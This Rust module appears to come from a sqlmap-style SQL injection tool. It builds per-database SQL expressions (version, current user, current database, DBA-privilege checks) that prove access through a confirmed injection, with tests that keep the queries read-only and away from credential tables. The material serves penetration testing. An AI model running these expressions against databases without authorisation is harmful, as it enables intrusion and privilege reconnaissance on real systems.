//! The extraction proof set: the scalar expressions that turn a confirmed
//! injection into undeniable proof of access (sqlmap's `--banner` /
//! `--current-user` / `--current-db` / `--is-dba`).
//!
//! Every expression is built from the typed [`DialectProfile`] — nothing is
//! guessed. An engine whose profile does not know a version / user / database
//! expression contributes no proof item for it (the `knows_*` guards), and
//! `is_dba` is offered only for the engines where we have a documented,
//! non-credential-table predicate. This is the honesty rule made structural:
//! a value we cannot ask for is never fabricated.

use crate::detection::DbmsFamily;
use crate::dialects::DialectProfile;

/// One proof-set item: a stable label and the scalar SQL expression that
/// yields it when read back through the confirmed channel.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProofExpr {
    pub label: &'static str,
    pub expr: String,
}

/// Build the proof set for an engine, skipping every fact the profile does not
/// know. Order mirrors sqlmap's default banner/user/db/is-dba disclosure.
pub fn proof_expressions(p: &DialectProfile) -> Vec<ProofExpr> {
    let mut out = Vec::new();
    if p.knows_version() {
        out.push(ProofExpr {
            label: "version",
            expr: p.version_expr.to_string(),
        });
    }
    if p.knows_user() {
        out.push(ProofExpr {
            label: "current_user",
            expr: p.user_expr.to_string(),
        });
    }
    if p.knows_database() {
        out.push(ProofExpr {
            label: "current_db",
            expr: p.database_expr.to_string(),
        });
    }
    if let Some(expr) = is_dba_expr(p.dbms) {
        out.push(ProofExpr {
            label: "is_dba",
            expr,
        });
    }
    out
}

/// A read-only predicate that reports whether the current login holds
/// administrative privileges, for the engines where one exists that does not
/// touch a credential table. Returns `None` (skipped, never guessed) elsewhere.
pub fn is_dba_expr(dbms: DbmsFamily) -> Option<String> {
    use DbmsFamily::*;
    let expr = match dbms {
        // information_schema.user_privileges is a read-only view (not the
        // mysql.user credential table the safety gate blocks).
        MySQL | MariaDB => {
            "(SELECT IF(COUNT(*)>0,1,0) FROM information_schema.user_privileges \
             WHERE privilege_type='SUPER' AND grantee LIKE \
             CONCAT('%',SUBSTRING_INDEX(CURRENT_USER(),'@',1),'%'))"
        }
        // pg_user is a read-only catalogue view exposing the usesuper flag.
        PostgreSQL => {
            "(SELECT CASE WHEN usesuper THEN 1 ELSE 0 END FROM pg_user \
             WHERE usename=CURRENT_USER)"
        }
        MSSQL | Sybase => "(SELECT IS_SRVROLEMEMBER('sysadmin'))",
        Oracle => {
            "(SELECT CASE WHEN COUNT(*)>0 THEN 1 ELSE 0 END FROM user_role_privs \
             WHERE granted_role='DBA')"
        }
        _ => return None,
    };
    Some(expr.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::dialects::profile;

    #[test]
    fn mysql_proof_set_is_complete() {
        let set = proof_expressions(&profile(DbmsFamily::MySQL));
        let labels: Vec<&str> = set.iter().map(|e| e.label).collect();
        assert_eq!(labels, vec!["version", "current_user", "current_db", "is_dba"]);
        assert_eq!(set[0].expr, "version()");
        assert_eq!(set[1].expr, "current_user()");
        assert_eq!(set[2].expr, "database()");
    }

    #[test]
    fn postgres_proof_set_uses_pipes_expressions() {
        let set = proof_expressions(&profile(DbmsFamily::PostgreSQL));
        assert_eq!(set[0].expr, "version()");
        assert_eq!(set[1].expr, "current_user");
        assert_eq!(set[2].expr, "current_database()");
        assert!(set.iter().any(|e| e.label == "is_dba"));
    }

    #[test]
    fn oracle_and_mssql_have_is_dba() {
        assert!(is_dba_expr(DbmsFamily::Oracle).is_some());
        assert!(is_dba_expr(DbmsFamily::MSSQL).is_some());
    }

    #[test]
    fn unknown_engine_yields_no_proof_and_no_guessed_is_dba() {
        // SAP HANA has no version/user/db expressions in its profile.
        let set = proof_expressions(&DialectProfile::unknown(DbmsFamily::SAPHANA));
        assert!(set.is_empty(), "an unknown engine must not fabricate a proof set");
        assert!(is_dba_expr(DbmsFamily::SAPHANA).is_none());
    }

    #[test]
    fn is_dba_never_names_a_credential_table() {
        // The gate blocks mysql.user; our MySQL predicate must avoid it.
        for dbms in DbmsFamily::ALL {
            if let Some(expr) = is_dba_expr(*dbms) {
                let upper = expr.to_uppercase();
                assert!(!upper.contains("MYSQL.USER"), "{dbms:?} is_dba hit a credential table");
                assert!(
                    matches!(
                        crate::safety::is_extraction_read_only(&expr),
                        crate::safety::SafetyVerdict::Permitted
                    ),
                    "{dbms:?} is_dba expression failed the read-only gate: {expr}"
                );
            }
        }
    }
}
